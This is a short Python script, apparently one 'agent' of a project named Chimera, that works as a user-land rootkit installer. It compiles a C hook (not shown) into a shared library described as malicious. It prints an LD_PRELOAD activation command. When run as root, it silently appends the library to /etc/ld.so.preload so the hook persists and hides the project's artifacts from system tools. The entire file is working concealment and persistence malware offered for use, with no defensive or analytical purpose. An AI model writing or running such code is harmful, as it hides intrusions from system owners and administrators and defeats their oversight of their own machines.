#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import subprocess

class RootkitLite:
    """
    Agent 210: Shared Object Hijacker.
    Compiles a malicious SO and injects it into the dynamic linker 
    to hide Chimera artifacts from system tools.
    """
    def __init__(self):
        self.src = "/home/dan/Chimera_Project/agents/210_Kernel_Rootkit_Lite/src/hook.c"
        self.so_path = "/home/dan/Chimera_Project/agents/210_Kernel_Rootkit_Lite/src/chimera_hook.so"

    def execute(self):
        print("--- [AGENT 210: USER-LAND ROOTKIT ACTIVATION] ---")
        
        # 1. Compile the C code into a Shared Object
        try:
            subprocess.run([
                "gcc", "-shared", "-fPIC", self.src, 
                "-o", self.so_path, "-ldl"
            ], check=True)
            print(f"[*] Compiled stealth hook: {self.so_path}")
        except Exception as e:
            print(f"[!] Compilation failed (is gcc installed?): {e}")
            return

        # 2. To activate, the user would need to set the environment variable.
        # For professional persistence, we would add this to /etc/ld.so.preload
        print(f"[!!!] TO ACTIVATE STEALTH, RUN:")
        print(f"export LD_PRELOAD={self.so_path}")
        
        # Architecture Insight: If we have root, we make it permanent
        if os.getuid() == 0:
            with open("/etc/ld.so.preload", "a") as f:
                f.write(f"{self.so_path}\n")
            print("[+] PERSISTENCE: Added to /etc/ld.so.preload. Chimera is now invisible.")

if __name__ == "__main__":
    RootkitLite().execute()
